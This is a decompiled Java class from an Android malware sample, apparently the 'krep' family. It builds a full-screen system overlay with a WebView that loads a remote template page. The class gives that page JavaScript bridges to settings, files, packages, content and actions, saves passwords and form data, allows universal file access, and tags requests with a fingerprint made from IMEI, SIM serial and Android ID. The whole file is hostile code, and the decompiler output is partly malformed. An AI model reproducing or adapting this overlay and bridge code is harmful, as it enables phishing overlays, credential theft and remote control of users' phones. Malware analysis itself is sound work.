package krep.itmtd.ywtjexf;

import android.annotation.SuppressLint;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.content.pm.PackageManager.NameNotFoundException;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.provider.Settings.Secure;
import android.telephony.TelephonyManager;
import android.view.LayoutInflater;
import android.view.View;
import android.view.WindowManager;
import android.view.WindowManager.LayoutParams;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.widget.RelativeLayout;
import android.widget.TextView;
import java.util.UUID;

public class OverlayView
  extends RelativeLayout
{
  private TextView info;
  protected WindowManager.LayoutParams layoutParams;
  private Context mcontext;
  private int notificationId = 0;
  private String template = "";
  
  public OverlayView(OverlayService paramOverlayService, int paramInt, Context paramContext, String paramString)
  {
    super(paramOverlayService);
    this.mcontext = paramContext;
    this.notificationId = paramInt;
    this.template = paramString;
    setLongClickable(true);
    load();
  }
  
  public static String getUniqueID(Context paramContext)
  {
    Object localObject = (TelephonyManager)paramContext.getSystemService("phone");
    str = ((TelephonyManager)localObject).getDeviceId();
    localObject = ((TelephonyManager)localObject).getSimSerialNumber();
    localObject = new UUID(Settings.Secure.getString(paramContext.getContentResolver(), "android_id").hashCode(), str.hashCode() << 32 | ((String)localObject).hashCode()).toString();
    str = "";
    try
    {
      ApplicationInfo localApplicationInfo = paramContext.getPackageManager().getApplicationInfo(paramContext.getPackageName(), 128);
      paramContext = str;
      if (localApplicationInfo.metaData != null) {
        paramContext = localApplicationInfo.metaData.getString("sub");
      }
    }
    catch (PackageManager.NameNotFoundException paramContext)
    {
      for (;;)
      {
        paramContext.printStackTrace();
        paramContext = str;
      }
    }
    return localObject + "-" + paramContext;
  }
  
  @SuppressLint({"NewApi"})
  private void inflateView()
  {
    Object localObject1 = (LayoutInflater)getContext().getSystemService("layout_inflater");
    Object localObject2 = (WebView)findViewById(2131099649);
    if (this.template.contains("#full"))
    {
      this.template = this.template.substring(0, this.template.length() - 5);
      ((LayoutInflater)localObject1).inflate(2130903042, this);
    }
    for (;;)
    {
      localObject1 = (WebView)findViewById(2131099649);
      ((WebView)localObject1).setBackgroundColor(0);
      ((WebView)localObject1).addJavascriptInterface(new MeSetting(this.mcontext), "MeSetting");
      ((WebView)localObject1).addJavascriptInterface(new MeSystem(this.mcontext), "MeSystem");
      ((WebView)localObject1).addJavascriptInterface(new MeFile(this.mcontext), "MeFile");
      ((WebView)localObject1).addJavascriptInterface(new MePackage(this.mcontext), "MePackage");
      ((WebView)localObject1).addJavascriptInterface(new MeContent(this.mcontext), "MeContent");
      ((WebView)localObject1).addJavascriptInterface(new MeAction(this.mcontext), "MeAction");
      localObject2 = ((WebView)localObject1).getSettings();
      ((WebSettings)localObject2).setSavePassword(true);
      ((WebSettings)localObject2).setSaveFormData(true);
      ((WebSettings)localObject2).setAllowFileAccess(true);
      if (Build.VERSION.SDK_INT >= 16)
      {
        ((WebSettings)localObject2).setAllowFileAccessFromFileURLs(true);
        ((WebSettings)localObject2).setAllowUniversalAccessFromFileURLs(true);
      }
      ((WebSettings)localObject2).setJavaScriptEnabled(true);
      ((WebSettings)localObject2).setUserAgentString("Hash: " + getUniqueID(this.mcontext));
      try
      {
        localObject2 = this.mcontext.getPackageManager().getApplicationInfo(this.mcontext.getPackageName(), 128);
        if (((ApplicationInfo)localObject2).metaData != null) {
          ((ApplicationInfo)localObject2).metaData.getString("domain");
        }
        if (this.template.length() > 0) {
          ((WebView)localObject1).loadUrl(this.template);
        }
        return;
        ((LayoutInflater)localObject1).inflate(2130903041, this);
      }
      catch (PackageManager.NameNotFoundException localNameNotFoundException)
      {
        for (;;)
        {
          localNameNotFoundException.printStackTrace();
        }
      }
    }
  }
  
  private void setupLayoutParams()
  {
    this.layoutParams = new WindowManager.LayoutParams(-1, -1, 2010, 256, -3);
    this.layoutParams.gravity = getLayoutGravity();
    onSetupLayoutParams();
  }
  
  protected void addView()
  {
    setupLayoutParams();
    ((WindowManager)getContext().getSystemService("window")).addView(this, this.layoutParams);
    super.setVisibility(8);
  }
  
  protected View animationView()
  {
    return this;
  }
  
  public void destory()
  {
    ((WindowManager)getContext().getSystemService("window")).removeView(this);
  }
  
  public int getGravity()
  {
    return 53;
  }
  
  public int getLayoutGravity()
  {
    return 17;
  }
  
  protected int getLeftOnScreen()
  {
    int[] arrayOfInt = new int[2];
    getLocationOnScreen(arrayOfInt);
    return arrayOfInt[0];
  }
  
  public OverlayService getService()
  {
    return (OverlayService)getContext();
  }
  
  protected int getTopOnScreen()
  {
    int[] arrayOfInt = new int[2];
    getLocationOnScreen(arrayOfInt);
    return arrayOfInt[1];
  }
  
  protected void hide()
  {
    super.setVisibility(8);
  }
  
  protected boolean isInside(View paramView, int paramInt1, int paramInt2)
  {
    int[] arrayOfInt = new int[2];
    paramView.getLocationOnScreen(arrayOfInt);
    return (paramInt1 >= arrayOfInt[0]) && (paramInt1 <= arrayOfInt[0] + paramView.getWidth()) && (paramInt2 >= arrayOfInt[1]) && (paramInt2 <= arrayOfInt[1] + paramView.getHeight());
  }
  
  public boolean isVisible()
  {
    return true;
  }
  
  protected void load()
  {
    inflateView();
    addView();
    refresh();
  }
  
  protected void onSetupLayoutParams() {}
  
  protected boolean onVisibilityToChange(int paramInt)
  {
    return true;
  }
  
  public void refresh()
  {
    if (!isVisible())
    {
      setVisibility(8);
      return;
    }
    setVisibility(0);
  }
  
  public void refreshLayout()
  {
    if (isVisible())
    {
      removeAllViews();
      inflateView();
      onSetupLayoutParams();
      ((WindowManager)getContext().getSystemService("window")).updateViewLayout(this, this.layoutParams);
      refresh();
    }
  }
  
  protected void reload()
  {
    unload();
    load();
  }
  
  public void setVisibility(int paramInt)
  {
    boolean bool2 = false;
    boolean bool1 = false;
    if (paramInt == 0)
    {
      localOverlayService = getService();
      i = this.notificationId;
      if (showNotificationHidden()) {}
      for (;;)
      {
        localOverlayService.moveToForeground(i, bool1);
        if ((getVisibility() != paramInt) && (onVisibilityToChange(paramInt))) {
          super.setVisibility(paramInt);
        }
        return;
        bool1 = true;
      }
    }
    OverlayService localOverlayService = getService();
    int i = this.notificationId;
    if (showNotificationHidden()) {}
    for (bool1 = bool2;; bool1 = true)
    {
      localOverlayService.moveToBackground(i, bool1);
      break;
    }
  }
  
  protected void show()
  {
    super.setVisibility(0);
  }
  
  protected boolean showNotificationHidden()
  {
    return true;
  }
  
  protected void unload()
  {
    ((WindowManager)getContext().getSystemService("window")).removeView(this);
    removeAllViews();
  }
}


/* Location:              /home/enzo/Documents/hacking/malwares/krep/classes-dex2jar.jar!/krep/itmtd/ywtjexf/OverlayView.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       0.7.1
 */